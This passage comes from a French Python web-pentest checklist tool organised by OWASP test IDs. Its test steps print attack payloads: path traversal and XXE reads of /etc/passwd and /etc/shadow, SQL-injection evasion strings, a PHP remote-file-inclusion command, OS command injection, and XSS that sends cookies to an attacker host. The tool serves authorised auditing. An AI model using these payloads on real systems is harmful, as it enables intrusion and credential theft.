     print("    => Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd")


     conclusion()
     print("[OK] S'il n'est pas possible d'accéder à des documents illégitimes.")
     print("[KO] Sinon.") 

    def OTG_AUTHZ_002(self):
     banniere("OTG AUTHNZ 002")
     objectif()
     print("Vérification de la sécurité du schéma d'autorisation mis en œuvre pour chaque rôle / privilège.")
     print("Est-il possible d'accéder à des documents après déconnexion / non authentifié ? Des documents d'administrations ?")
     print("Un utilisateur peut-il accéder à des modules d'administration?")

     test()
     print("[+] Tester d'accéder au module d'administration.")
     print("[+] Tester d'accéder aux ressources d'autres rôles.")
     print("    Ex: Si document1.pdf doit etre accessible uniquement depuis user1 avec le rôleA ; est ce que user2 avec le rôleB peut y accéder etc.")


     conclusion()
     print("[OK] S'il n'est pas possible d'accéder aux ressources après déconnexion / d'administration / d'autres rôles")
     print("[KO] Sinon.")


    def OTG_AUTHZ_003(self):
     banniere("OTG AUTHNZ 003")
     objectif()
     print("Vérifier qu'il ne soit pas possible d'élever ses droits utilisateurs.")
     print("Différents type : ")
     print("   Utilisateur connecté avec certains droits à accès a une fonctionnalité en plus grâce à une erreur système.")
     print("   Un utilisateur non connecté à accès à l'interface d'administration.")

     test()
     print("[+] Manipulation des rôles : ")
     print("     => Tester d'accéder à des rôles différents")
     print("     Exemple : Requête POST avec  groupID=grp001&orderID=0001   => changer le groupe et l'ordre")
     print("     => Profiles différents")
     print("     Exemple : Si Profil=user ; changer en Profil=SysAdmin ...")
     print("[+] Manipulation des IP :")
     print("    Changer le header X-forwarded-For par une autre IP source.")
     print("[+] URL trasnversal :")
     print("     Vérifier que l'url /../.././userInfo.html n'est pas accessible")
     print("[+] Variables de sessions prévisibles")

     conclusion()
     print("[OK] S'il n'est pas possible de changer de rôle.")
     print("[KO] Sinon.")


    def OTG_AUTHZ_004(self):
     banniere("OTG AUTHNZ 004")
     objectif()
     print("Vérifier s'il est possible d'accéder à des documents sans habilitation.")

     test()
     print("[+] Résultats dirsearch : documents/fichiers accessibles sans authentification")
     print("[+] Tenter d'accéder à la base de donnée : ")
     print("     http://foo.bar/somepage?invoice=12345")
     print("[+] Tenter d'effectuer une action système :")
     print("    http://foo.bar/changepassword?user=someuser")
     print("[+] Tenter d'accéder à des ressources systèmes :")
     print("    http://foo.bar/showImage?img=img00011")
     print("[+] Tenter d'accéder à des autres fonctionnalités :")
     print("     http://foo.bar/accessPage?menuitem=12")
     

     conclusion()
     print("[OK] S'il n'est pas possible d'accéder à des données/fonctionnalités ")
     print("[KO] Sinon.")


    def OTG_AUTHZ(self):
     os.system('clear')
     self.OTG_AUTHZ_001()
     input("Appuyez sur une touche pour changer d'OTG AUTHZ.")
     os.system('clear')
     self.OTG_AUTHZ_002()
     input("Appuyez sur une touche pour changer d'OTG AUTHZ.")
     os.system('clear')
     self.OTG_AUTHZ_003()
     input("Appuyez sur une touche pour changer d'OTG AUTHZ.")
     os.system('clear')
     self.OTG_AUTHZ_004()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')


## OTG-SESS : Gestion des sessions

    def OTG_SESS_001(self):
     banniere("OTG SESS 001")
     objectif()
     print("Contrôle des disfonctionnements dans la gestion des sessions, permettant à un attaquant d'usurper une identité.")
     print("Un cookie avec une date d'expiration est dit \"persistant\" car il n'est pas supprimé après la fin de la session / fermeture du navigateur.")
     print("Un cookie sans date d'expiration est supprimé à la fin de la session.")

     test()
     print("[+] Cookies : (=> F12 => Network => Cookie) ")
     print("              - Présence du flag SECURE ? (envoi du cookie uniquement en HTTPS) ")
     print("                   Set Cookie: cookie=data; path=/; domain=.aaa.it; secure ")
     print("              - Présence du HTTPOnly ?")
     print("                   Set Cookie: cookie=data; path=/; domain=.aaa.it; HTTPOnly")
     print("              - Le cookie ne doit pas être persistant !!!")
     print("                Si le cookie est de type persistant : ")
     print("                      Le paramètre \"Expires = durée\" est-il correct? ")

     print("[+]  Analyse de session  (Cookie, SessionID, Champ Caché) :")
     print("              Le SessionID est-il static? ecrit en clair? information sensible?")
     print("              La structure du SessionId est-elle prévisible? ex: ip:nom:mdp ou hashée ? quel algorithme? juste de l'hexa?")
     
     conclusion()
     print("[OK] Si le cookie n'est pas persistant et que les attributs de securité sont bien mis (Secure, HTTPOnly).")
     print("[KO] Sinon.")


    def OTG_SESS_002(self):
     banniere("OTG SESS 002")
     objectif()
     print("Vérification de la présence des attributs de sécurité sur les cookies de session et l'imprédictibilité de ceux-ci.")

     test()
     print("Se connecter à l'application que l'on souhaite auditée.")
     print("   Cookie : F12 => Network => Cookies\n")
     print("[+] Présence de l'attribut \";secure\" : ")
     print("    => Envoi du cookie uniquement sur canal HTTPS\n")
     print("[+] Présence de l'attribut \";HttpOnly\" :")
     print("    => Interdit l'accès via un script - exemple attaques XSS avec du javascript\n")
     print("[+] Présence de l'attribut \";domain\" :")
     print("    => Domaine où fonctionne le cookie ; RESTRICTIF : domain=app.mysite.com et non pas domain=.mysite.com\n")
     print("[+] Présence de l'attribut \";path\" :")
     print("    => En lien avec le domaine - le chemin URL où le cookie est valide.\n")
     print("    Restrictif : si l'application est dans myapp : path=/myapp/ et PAS path=/ ")
     print("Note : Si le domaine ou le path ne sont pas assez explicites - l'application peut être vulnérable a des attaques provenant d'autres applications du même serveur.")
     
     for domaine in self.__AllDomains:
        domaine.checkCookieAttributes()

     print("[-] Présence de l'attribut \";expires\" :")
     print("    => Création d'un cookie persistant - il n'est pas supprimé à la fin de la session ou à la fermeture du navigateur mais à son expiration.\n")
     conclusion()

     print("[OK] Si les attributs Secure, HTTPOnly, domain, path sont présents et bien configurés.")
     print("[KO] Sinon.")


    def OTG_SESS_003(self):
     banniere("OTG SESS 003")
     objectif()
     print("Vérification de la possibilité de prédéfinir un cookie de session (fixation de session) pour forcer un utilisateur à se connecter avec celui-ci.")

     test()
     print("1. Connexion a la page a audité : un certain cookie est présent ")
     print("   => Set-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure")
     print("   Maintenant on s'authentifie : la réponse du serveur n'intègre pas de renouvellement de cookie")
     print("    => Présence d'une fixation de session")
     print("2. Autre moyen : après avoir été authentifié, modifié les 8 premiers caractères du cookie par deadbeef")
     print("   Se deconnecter et se reconnecter : le cookie devrait se modifier tout seul. Dans le cas contraire : fixation de session."  )
     print("\n")
     print("Automatisation :")

     conclusion()
     print("[OK] Si une fixation de session est présente.")
     print("[KO] Sinon.")

    def OTG_SESS_004(self):
     banniere("OTG SESS 004")
     objectif()
     print("Vérification du transport des variables de sessions. Dans le cas d'une communication, l'utilisateur serait exposé à des attaques de types Man in the Middle.")

     test()
     print("[+] A chaque authentification au site audité, l'utilisateur doit recevoir un token différent")
     print("    Si le site utilise le protocole HTTP, un token doit être envoyé à chaque requête.")
     print("[+] Présence des headers : \“Expires: 0\” and Cache-Control: max-age=0")
     print("[+] Ne pas utiliser de requêtes GET pour envoyer la Session ID")
     print("[+] Si le formulaire d'authentification s'envoit grâce à une requête POST, rejouer la même requête avec un GET : http://owaspapp.com/login.asp?Login=Username&password=Password&SessionID=12345678 ")

     conclusion()
     print("[OK] Si la variable de session est envoyée via un canal sécurisé.")
     print("[KO] Sinon.")

    def OTG_SESS_005(self):
     banniere("OTG SESS 005")
     objectif()

     print("Vérifier qu'il n'est pas possible de forcer un utilisateur à exécuter sans le savoir, par le biais d'une vulnérabilité Cross Site Request Forgery, des actions non désirées sur l'application web dans laquelle il a des droits.")
     print("Exemple : Un utilisateur connecté clique sur un lien et sans le savoir il vient de modifier son mot de passe ou son adresse mail sur le site.")
     test()

     print("1. Se connecter avec un compte utilisateur.")
     print("2. Naviguer sur l'application avec le proxy BRUP activé")
     print("3. Se rendre dans le panneau de modification du compte utilisateur \"Mon Compte\"")
     print("   Dans ce formulaire apparait les informations utilisateur (mot de passe, email, numéro de mobile) avec un bouton \"Soumettre\" en dessous.")
     print("4. Dans Burp : \"Intercept\" => \"Intercept is ON\"")
     print("5. Soumettre le formulaire en passant par le proxy")
     print("6. Sur la requête Burp : Clique droit => Engagement tools => Generate CSRF POC")
     print("7. Dans la nouvelle fenêtre, changer l'adresse mail par pentest@fidens.fr")
     print("8. \"Tester dans un navigateur\".")
     print("9. Depuis le point de vue de l'utilisateur légitime - cliquer sur \"Submit request\"")
     print("    => Si l'attaque CSRF est possible, cette étape modifie l'adresse mail de l'utilisateur légitime - sans qu'il en ait conscience.")
     print("Reference : https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery")

     conclusion()
     print("[OK] Si la variable de session est envoyée via un canal sécurisé.")
     print("[KO] Sinon.")

    def OTG_SESS_006(self):
     banniere("OTG SESS 006")
     objectif()
     print("Vérifier qu'une fonction de déconnexion est possible et qu'aucune donnée n'est visible après la déconnexion de la session.")

     test()
     print("[+] Présence d'une fonctionnalité de déconnexion sur chaque page du site?")
     print("[+] Affichage d'une page de déconnexion ?")
     print("[+] Une longue période d'inaction doit engendrer une déconnexion.")
     print("[+] Si session accessible via SSO - la déconnexion doit interdire à l'utilisateur de réutiliser les SSO de sessions.")
     print("Outil utile: Burp suite Repeater")
     conclusion()
     print("[OK] Si la variable de session est envoyée via un canal sécurisé.")
     print("[KO] Sinon.")


    def OTG_SESS_007(self):
     banniere("OTG SESS 007")
     objectif()
     print("Vérification de l'expiration des sessions.")

     test()
     print("[+] La déconnexion automatique a-t-elle lieu lors d'une longue période d'inactivité? ")
     print("     => Après déconnexion, les variables de sessions sont-elles réinitialisées ?")
     print("[+] Après déconnexion, le tester doit comprendre si cette dernière a été mise en place par le client ou le serveur.")
     print("    => Si le cookie est non persistant (pas de Expires: <période> ) => déconnexion initiée par le serveur.")
     print("    => Si le cookie est persistant / comporte des informations sur la date d'expiration => déconnexion sûrement initiée par le client")
     print("        Le client peut tenter de modifier cette date dans le futur (s'il n'est pas cryptographiquement protégé) et voir le comportement de la session.")


     conclusion()
     print("[OK] Si une déconnexion automatique est mise en place.")
     print("[KO] Sinon.")

    def OTG_SESS_008(self):
     banniere ("OTG SESS 008")
     objectif()
     print("Vérifier que les variables de session initialisées dans un contexte ne peuvent pas être utilisées dans un autre usage que celui défini par le développeur, en raison d'une confusion de session.")

     test()
     print("[+] Dans un contexte de réinitialisation de mot de passe, le client apporte des informations sur son adresse mail ou son nom d'utilisateur.")
     print("    Comme ces informations sont envoyés du côté client : la variable de session comportera ces nouvelles informations. ")
     print("    L'objet de session peut dévoiler des informations sensibles.")
     print("[+] Est-il possible de contourner le processus d'authentification en comprenant le mécanisme de session et en le modifiant ?")

     conclusion()
     print("[OK] Si le contete d'établissement de session ne pas être utilisé à des fins non légitimes.")
     print("[KO] Sinon.")

    def OTG_SESS(self):
     os.system('clear')
     self.OTG_SESS_001()
     input("Appuyez sur une touche pour changer d'OTG SESS.")
     os.system('clear')
     self.OTG_SESS_002()
     input("Appuyez sur une touche pour changer d'OTG SESS.")
     os.system('clear')
     self.OTG_SESS_003()
     input("Appuyez sur une touche pour changer d'OTG SESS.")
     os.system('clear')
     self.OTG_SESS_004()
     input("Appuyez sur une touche pour changer d'OTG SESS.")
     os.system('clear')
     self.OTG_SESS_005()
     input("Appuyez sur une touche pour changer d'OTG SESS.")
     os.system('clear')
     self.OTG_SESS_006()
     input("Appuyez sur une touche pour changer d'OTG SESS.")
     os.system('clear')
     self.OTG_SESS_007()
     input("Appuyez sur une touche pour changer d'OTG SESS.")
     os.system('clear')
     self.OTG_SESS_008()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')


# OTG INPVAL 

    def OTG_INPVAL_001(self):
     banniere("OTG INPVAL 001")     
     objectif()
     print("Vérifier la présence de XSS réfléchie.")
     print("XSS est une vulnérabilité permettant l'injection de code HTML ou JAVASCRIPT dans des variables protégées.")
     print("Réfléchie signifie executée à la volée ; elle n'est pas stockée en base de donnée.")

     test()
     print("[+] Utiliser le scanner de vulnérabilité NESSUS. l'Advanced Scan retourne des informations si des XSS réfléchies sont présentes.")
     print("[+] BURP INTRUDER avec la liste XSS")
     print("[+] Une fois connecté au site, injecter les charges suivantes dans tous les champs")
     print("    <IMG SRC=x onerror=prompt(1)></img> ")
     print("    ><img src=x onerror= prompt(1)>")
     print("    <iframe src=\"https://www.fidens.fr\"></iframe>")
     print("    \"><script>alert(document.cookie)</script>")
     print("     * Tag Attribute Value : %3cscript%3ealert(document.cookie)%3c/script%3e")
     print("     * Bypassing non-recursive filtering : <scr<script>ipt>alert(document.cookie)</script>")
     print("     * Including external script : <SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss.js\"></SCRIPT>")
     print("     * HTTP Parameter Pollution : http://example/page.php?param=<script&param=>[...]</&param=script>")

     outil()
     print("NESSUS, BURP\n\n")

     print("[+] Lancement de l'outil XSStrick :    ")


     if os.path.isfile('/opt/xss-strike/xsstrike.py '):
        os.system("python3.7 /opt/xss-strike/xsstrike.py  --update")        
     else:
        os.system("cd /opt/ && git clone --depth 1 https://github.com/Ra1dhunter/xss-strike")
            

     for domaine in self.__AllDomains:
          domaine.launchXSSStrike()   



     conclusion()
     print("[OK] S'il n'y a pas de XSS réfléchies.")
     print("[KO] Sinon.")


    def OTG_INPVAL_002(self):
     banniere("OTG INPVAL 002")
     objectif()
     print("Vérifier la présence de XSS stockée.")
     print("XSS est une vulnérabilité permettant l'injection de code HTML ou JAVASCRIPT dans des variables protégées.")
     print("Stockée signifie présente en base de donnée / elle s'executera lorsque la page web sera chargée.")

     test()
     print("[+] Lieu où des XSS stockées peuvent apparaître :")
     print("    Module \"Mon compte\" : la modification des détails du compte utilisateur ")
     print("    Dans le panier d'un site de shopping")
     print("    Dans le gestionnaire de fichiers")
     print("    Dans le menu préférence / paramètres d'une application")
     print("    Dans les messages d'un forum")
     print("    Dans les articles / commentaires d'un blog")
     print("    Dans les journaux de connexion")

     print("[+] Type de XSS :")
     print("    <IMG SRC=x onerror=prompt(1)></img> ")
     print("    ><img src=x onerror= prompt(1)>")
     print("    <iframe src=\"https://www.fidens.fr\"></iframe>")
     print("    aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;")
     print("    aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E")

     conclusion()
     print("[OK] S'il n'y a pas de XSS stockées.")
     print("[KO] Sinon.")


    def OTG_INPVAL_003(self):
     banniere("OTG INPVAL 003")
     objectif()
     print("Tester la présence de méthode HTTP non standards (autre que GET et POST), permettant une falsification de méthode HTTP et d'obtenir des informations ou outrepasser une authentification.")

     test()

     for domaine in self.__AllDomains:
          domaine.checkAllMethodsHTTP(self.__METHODS)  

     conclusion()
     print("[OK] Si les seules méthodes acceptées sont  OPTIONS, GET, HEAD et POST.")
     print("[KO] Sinon.")

    def OTG_INPVAL_004(self):
     banniere("OTG INPVAL 004")
     objectif()
     print("HTTP Parameter Pollution (HPP en court) affecte aussi bien le côté serveur que client.")
     print("Il s'agit de vérifier qu'il n'est pas possible d'inclure de multiples entrées HTTP pour contourner les principes de sécurité.")

     test()
     print("[+] Server Side HPP")
     print("    Concatenation : \"/index.aspx?page=select 1,2,3 from table\" : \"/index.aspx?page=select 1&page=2,3\" ")
     print("    XSS : \"http://localhost/admin/?kerberos=onmouseover=alert(1)&kerberos\"")
     print("    Multiples occurences : http://localhost/?color=red&color=blue\n")
     print("[+] Client Side HPP")
     print("    Chercher le symbole qui relie les paramètres (&HPP_TEST, &amp;HPP_TEST) et poluer comme precedemment.")


     conclusion()
     print("[OK] Si il est possible de procéder à du HPP.")
     print("[KO] Sinon.")


    def OTG_INPVAL_005(self):
     banniere("OTG INPVAL 005")
     objectif()
     print("Vérifier qu'il n'y à pas d'injection SQL")


     test()
     print("[+] Détecter les pages qui communiques avec les bases de données.")
     print("    -> Les pages d'authentification : formulaire web qui communique avec la base de données pour le nom et le mdp.")
     print("    -> Les pages de recherches : des demandes sont faites dans les bases de données.")
     print("    -> Sites e-commerce : requêtes en bdd pour les produits et les caractéristiques.\n")
     print("1. Remplacer les champs interessant par une quote ' (SQL terminaison de string) ou un point virgule ; (SQL terminaison d'instruction)")
     print("   => Erreur?")
     print("2. Ajout des commentaires (-- , /* */, #) et des mots 'AND' ou 'OR'.")
     print("3. Injection d'un string là où on attend un chiffre.")
     print("4. Utilisation de BRUP INTRUDER avec la liste all-attack-unix dans tous les formulaires.\n")

     print("Messages d'erreur pour déterminer le type de base de données :")
     print("Mysql : ")
     print("You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\'' at line 1")
     print("Oracle :")
     print("ORA-00933: SQL command not properly ended")
     print("MS SQL Server :")
     print("Microsoft SQL Native Client error '80040e14' Unclosed quotation mark after the character string. SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1")
     print("PostgreSQL :")
     print("Query failed: ERROR: syntax error at or near - &quot;�&quot; at character 56 in /www/site/test.php on line 121.\n")

     print("[+] Plusieurs techniques : Union Exploitation Technique")
     print("    Boolean Exploitation Technique,")
     print("    Error based Exploitation technique,")
     print("    Out of band Exploitation technique,")
     print("    Time delay Exploitation technique,")
     print("    Stored Procedure Injection,")
     print("    Automated Exploitation : SQLMap\n")

     print("[+] SQL Injection signature Evasion Techniques")
     print("    Espace : or 'a'           =        'a' ")
     print("    Null Bytes : %00    exemple : %00' ")
     print("    Commentaires SQL : ")
     print("      - ' UNION SELECT password FROM Users WHERE name='admin'--  => '/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'-- ")
     print("      -                                                          => '/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'-- ")
     print("     URL Encoding : ' UNION SELECT password FROM Users WHERE name='admin'-- => \%27%20UNION%20SELECT%20password\%20FROM%20Users%20WHERE%20name%3D\%27admin%27--")
     print("     Character Encoding : ' UNION SELECT password FROM Users WHERE name='root'-- => ' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--")
     print("     String Concatenation : select 1 =>  EXEC('SEL' + 'ECT 1')")
     print("     Hex Encoding :  Select user from users where name = 'root' => Select user from users where name = 726F6F74")
     print("                                                                => Select user from users where name = unhex('726F6F74')")
     print("     Declare variables : Union Select password =>       ; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password'); EXEC(@SQLivar)")

     conclusion()
     print("[OK] Si présence d'injection SQL")
     print("[KO] Sinon.")


    def OTG_INPVAL_006(self):
     banniere("OTG INPVAL 006")
     objectif()
     print("Vérifier la présence d'injection LDAP (Lightweigh Directory Access Protocol)")

     test()
     print("[+] Recherche d'un utilisateur : searchfilter=\"(cn=\"+user+\")\"   => http://www.example.com/ldapsearch?user=John")
     print("    On remplace John par * : http://www.example.com/ldapsearch?user=*  => searchfilter=\"(cn=*)\"")
     print("     => si injection ldap : énumération des utilisateurs ")
     print("    Remplacer * par (', '|', '&', '*' ")
     print("[+] Recherche d'un utilisateur 2 : searchlogin= \"(&(uid=\"+user+\")(userPassword=\{MD5}\"+base64(pack(\"H*\",md5(pass)))+\"))\";")
     print("    On remplace les paramètres par : user=*)(uid=*))(|(uid=* et pass=password")
     print("     Le résultat devient : searchlogin=\"(&(uid=*)(uid=*))(|(uid=*)(userPassword=\{MD5}X03MO1qnZdYdgyfeuILPmQ==))\";")

     conclusion()
     print("[OK] Si pas d'injection LDAP possible")
     print("[KO] Sinon.")



    def OTG_INPVAL_007(self):
     banniere("OTG INPVAL 007")
     objectif()
     print("Vérifier la présence d'injection ORM. C'est à dire la présence de sql injection contre un ORM (data access object model).")

     test()
     print("[+] Black Box : Manière identique aux injections SQL")
     print("[+] Grey Box :  accès au code source de la page et vérifier des requêtes SQL")
     print("[+] Outil SQLMAP")

     outil()
     print("SQLMAP")

     conclusion()
     print("[OK] Si pas d'injection ORM possibles")
     print("[KO] Sinon.")
     
    def OTG_INPVAL_008(self):
     banniere("OTG INPVAL 008")
     objectif()
     print("Vérification de la présence d'injection XML. Si il y a un problème durant le parsage du document, alors le résultat est positif.")

     test()
     print("[+] Ajout de XLM metacharacters comme : ' \"  <  > <!--/--> &lt; <![CDATA[<fidens>]]> <![CDATA[]]>]]> $HTMLCode pour verifier la présence d'injection XLM.")
     print("[+] XSS : $HTMLCode`` ``=`` ``<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>")
     print("\n")
     print("[+] XXE : XML eXternal Entity - permet à un attaquant de faire un DOS, avoir acces a des fichiers non autorisés, scanner des machines a distances.")
     print("[+] ATTENTION : \"Could crash web server :\"")
     print(" <?xml`` ``version=\"1.0\"`` ``encoding=\"ISO-8859-1\"?> <!DOCTYPE`` ``foo`` ``[ <!ELEMENT`` ``foo`` ``ANY`` ``> <!ENTITY`` ``xxe`` ``SYSTEM`` ``\"file:///dev/random\"`` ``>]><foo>&xxe;</foo>")
     print("<?xml`` ``version=\"1.0\"`` ``encoding=\"ISO-8859-1\"?> <!DOCTYPE`` ``foo`` ``[ <!ELEMENT`` ``foo`` ``ANY`` ``> <!ENTITY`` ``xxe`` ``SYSTEM`` ``\"file:///etc/passwd\"`` ``>]><foo>&xxe;</foo> <?xml`` ``version=\"1.0\"`` ``encoding=\"ISO-8859-1\"?> <!DOCTYPE`` ``foo`` ``[ <!ELEMENT`` ``foo`` ``ANY`` ``> <!ENTITY`` ``xxe`` ``SYSTEM`` ``\"file:///etc/shadow\"`` ``>]><foo>&xxe;</foo> <?xml`` ``version=\"1.0\"`` ``encoding=\"ISO-8859-1\"?> <!DOCTYPE`` ``foo`` ``[ <!ELEMENT`` ``foo`` ``ANY`` ``> <!ENTITY`` ``xxe`` ``SYSTEM`` ``\"file:///c:/boot.ini\"`` ``>]><foo>&xxe;</foo> <?xml`` ``version=\"1.0\"`` ``encoding=\"ISO-8859-1\"?> <!DOCTYPE`` ``foo`` ``[ <!ELEMENT`` ``foo`` ``ANY`` ``> <!ENTITY`` ``xxe`` ``SYSTEM`` ``\"http://www.attacker.com/text.txt\"`` ``>]><foo>&xxe;</foo>")
     print("\n")
     print("[+] Revu de code :")
     print("Les JAVA API suivantes peuvent être vulnérables : ")
     print(" javax.xml.parsers.DocumentBuilder ;     javax.xml.parsers.DocumentBuildFactory ; org.xml.sax.EntityResolver ;  org.dom4j.* ;javax.xml.parsers.SAXParser    ;javax.xml.parsers.SAXParserFactory;TransformerFactory ; SAXReader ; DocumentHelper ; SAXBuilder ; SAXParserFactory ; XMLReaderFactory ; XMLInputFactory ;SchemaFactory ;DocumentBuilderFactoryImpl ;SAXTransformerFactory ;DocumentBuilderFactoryImpl ;XMLReader ;Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser")
     print("\n")
     print("[+] Injection de code :")
     print("Le but est de commenter notre USERID et de le changer par le numéro 0 (= admin).")
     print("Username:`` ``tony")
     print("Password:`` ``Un6R34kb!e</password><!--")
     print("E-mail:`` ``--><userid>0</userid><mail>s4tan@hell.com")
     print("Injection :")
     print("<?xml`` ``version=\"1.0\"`` ``encoding=\"ISO-8859-1\"?> <users> <user> <username>gandalf</username> <password>!c3</password> <userid>0</userid> <mail>gandalf@middleearth.com</mail> </user> <user> <username>Stefan0</username> <password>w1s3c</password> <userid>500</userid> <mail>Stefan0@whysec.hmm</mail> </user> <user> <username>tony</username> <password>Un6R34kb!e</password><!--</password> <userid>500</userid> <mail>--><userid>0</userid><mail>s4tan@hell.com</mail> </user> </users>")
     
     conclusion()
     print("[OK] Si injection XLM possibles.")
     print("[KO] Sinon.")


    def OTG_INPVAL_009(self):
     banniere("OTG INPVAL 009")
     objectif()
     print("Vérifier les code dynamique au sein des pages HTML : module incarné par les inclusions Server-Side Includes (SSI)")
     print("Le test permet de tester les mécanismes. SSI est un parsage réalisé par le serveur avant d'atteindre la page de l'utilisateur.")
     test()
     print("[+] Inserer dans les inputs :")
     print("   Affichage de l'heure : <!--#echo var=\"DATE_LOCAL\" -->")
     print("   Affichage de la sortie d'un script CGI : <!--#include virtual=\"/cgi-bin/counter.pl\" -->")
     print("   Affichage du contenu d'un fichier : <!--#include virtual=\"/footer.html\" -->")
     print("   Affichag du résultat d'une commande système <!--#exec cmd=\"ls\" -->")

     print("[+] Requete GET en changeant le User-agent et le referer")


     for domaine in self.__AllDomains:
          domaine.checkUserAgentAndReferer()

     conclusion()
     print("[OK] Si pas de Server-Side Inclusion.")
     print("[KO] Sinon.")

    def OTG_INPVAL_010(self):
     banniere("OTG INPVAL 010")
     objectif()
     print("Vérifier l'attaque XPath. XPATH est un language pour accéder à des documents XML.")
     print("Attaque datant de 2004.")

     test()
     print("Injections :")
     print("[+] Dans les formulaires d'authentification - username : ' or '1' = '1  et password : ' or '1' = '1 ")
     print("[+] username : \" NoSuchUser'] | P | //user[name/text()='NoSuchUser \" et password : NoSuchPass  => Ajout du noeux P")

     conclusion()
     print("[OK] Si pas d'injection XPATH disponibles.")
     print("[KO] Sinon.")

    def OTG_INPVAL_011(self):
     banniere("OTG INPVAL 011")
     objectif()
     print("Vérification des injections IMAP et SMTP.")

     test()
     print("[+] Recherche des paramètres vulnérables : ")
     print(" => Sur le serveur IMAP : l'authentification, les opérations avec les boites mails (liste, lecture, création,suppression, renommage)")
     print("Mettre un caractre null : http://<webmail>/src/read_body.php?mailbox=&passed_id=46106&startMessage=1")
     print("Changement de la valeur d'un parametre : http://<webmail>/src/read_body.php?mailbox=NOTEXIST&passed_id=46106&startMessage=1")
     print("Ajout d'autres paramètres : http://<webmail>/src/read_body.php?mailbox=INBOX PARAMETER2&passed_id=46106&startMessage=1")
     print("Caractère spéciaux : http://<webmail>/src/read_body.php?mailbox=INBOX\"&passed_id=46106&startMessage=1")
     print("Caractère spéciaux 2 : http://<webmail>/src/view_header.php?mailbox=INBOX%22&passed_id=46105&passed_ent_id=0")
     print("Eliminer un paramètre : ")
     print(" => Sur le serveur SMTP : l'emetteur de l'email , l'adresse de destination , le sujet, le corps du message, les fichiers attachés")
     print("MAIL FROM: <mailfrom>")
     print("RCPT TO: <rcptto>")
     print("DATA")
     print("Subject: SMTP Injection Example")
     print("\n")
     print("[+] Doc : http://www.webappsec.org/projects/articles/121106.pdf")

     conclusion()
     print("[OK] Si pas d'injections IMAP et SMTP")
     print("[KO] Sinon.")


    def OTG_INPVAL_012(self):
     banniere("OTG INPVAL 012")
     objectif()
     print("Vérifier qu'il n'est pas possible d'injecter du code.")

     test()
     print("[+] Test d'injection PHP")
     print(" RFI :http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a")
     print("[+] Test d'injection de code ASP")
     print("<%")
     print("If not isEmpty(Request( \"Data\") ) Then")
     print("Dim fso, f")
     print("'User input Data is written to a file named data.txt")
     print("Set fso = CreateObject(\"Scripting.FileSystemObject\")")
     print("Set f = fso.OpenTextFile(Server.MapPath( \"data.txt\" ), 8, True)")
     print("f.Write Request(\"Data\") & vbCrLf")
     print("f.close")
     print("Set f = nothing")
     print("Set fso = Nothing")
     print("'Data.txt is executed")
     print("Server.Execute( \"data.txt\" )")
     print("")
     print("Else")
     print("%>\\")
     print("\\ `<%`\\ `End If`\\ `%>)))`")

     conclusion()
     print("[OK] Si pas d'injections de code ASP ou PHP possible.")
     print("[KO] Sinon.")


    def OTG_INPVAL_013(self):
     banniere("OTG INPVAL 013")
     objectif()
     print("Vérification des injections de commandes sur l'OS.")

     test()
     print("[+] Accès à des docs : http://sensitive/cgi-bin/userData.pl?doc=user")
     print("        Modification : http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|")
     print("=> En perl le pipe | permet d'executer une commande.")
     print("De même caractère semicolon ;")
     print("        http://sensitive/something.php?dir=%3Bcat%20/etc/passwd")
     print("[+] Si passage du paramètre en POST : changement de la valeur par Doc1.pdf+|+Dir c:\\")
     print("S'il n'y à pas de validation, le contenu du c:/ sera affiché.")
     print("[+] Caractères pour injection de commande :    | ; & $ < > ` \\ !")


     conclusion()
     print("[OK] Si pas d'injections de commande possibles.")
     print("[KO] Sinon.")


    def OTG_INPVAL_014(self):
     banniere("OTG INPVAL 014")
     objectif()
     print("Vérification qu'il n'y a pas de BUFFER OWERVLOW (débordement de tampon).")

     test()
     print("[+] Pendant les tests, vérifier que les outils (Burp crawl, Dirsearch, Nessus) ne provoquent pas un ralentissement du site voire un déni de service.")
     
     conclusion()
     print("[OK] Si pas de débordement de tampon possible / Déni de service.")
     print("[KO] Sinon.")

    def OTG_INPVAL_015(self):
     banniere("OTG INPVAL 015")
     objectif()
     print("Recherche des vulnérabilités incubées (ou attaques persistantes). Ces attaques non asynchrones permettent de stocker des charges malveillantes éxecutées par les clients qui se connectent au site vulnérable.")

     test()
     print("[+] Inclusion de fichiers : si le fichier est accessible par un autre utilisateur (ex: SE)")
     print("[+] XSS stockées : <script>document.write('<img src=\"http://attackers.site/cv.jpg?'+document.cookie+'\">')</script>")
     print("=> Ajout de script, envoyant le cookie de l'utilisateur vers le site d'un attaquant.")
     print("=> La requête suivante est envoyée à l'attaquant : ")
     print(" - GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE;")
     print("   %20JSESSIONID=ADIFFERENTVALUE:-1;\%20ExpirePage=https://vulnerable.site/site/;")
     print("   TOKEN=28_Sep_2006_21:46:36_GMT HTTP/1.1")
     print("[+] Injection SQL : ")
     print("SELECT field1, field2, field3")
     print("  FROM table_x")
     print("  WHERE field2 = 'x';")
     print("     UPDATE footer")
     print("     SET notice = 'Copyright 1999-2030%20")
     print("         <script>document.write(\'<img src=\"http://attackers.site/cv.jpg?\'+document.cookie+\'\">\')</script>'")
     print("     WHERE notice = 'Copyright 1999-2030';")
     print("[+] Serveur mal configuré :")
